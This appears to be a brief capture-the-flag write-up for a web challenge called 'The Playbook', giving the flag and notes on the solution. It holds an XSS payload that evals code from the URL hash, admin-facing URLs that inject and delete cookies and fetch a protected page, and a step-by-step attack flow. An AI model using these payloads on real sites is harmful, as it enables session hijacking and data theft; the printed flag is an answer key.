Name: The Playbook

Desc: This is going to be Legend ... wait for it ... and I hope you're not lactose-intolerant coz

Flag: inctf{dary_l3g3nd4ry_238397}



<!-- Payload my end
<img src=x onerror=eval(decodeURIComponent(location.hash.substr(1)))></img>
 -->

<!-- Admin Side
http://localhost:3000/find_notes?startsWith=d&debug=y&Set-Cookie=id=f616c83f2f0f188265c7004d81d45723%3B%20path=/get_notes 
-->

<!-- Admin Side
http://localhost:3000/#document.cookie=%22id=68b329da9893e34099c7d8ad5cb9c940;%20expires=Thu,%2001%20Jan%201970%2000:00:00%20UTC;path=/get_notes;%22;document.cookie=x;fetch('/get_notes').then(response=%3Eresponse.text()).then(data=%3Econsole.log(data));
-->

what da flow?

send admin the link --> add your cookie to the panel --> now, load the page --> the payload gets initialised --> delete the user's cookie --> make a fetch to the admin's /get-flag --> all is good as its in the same page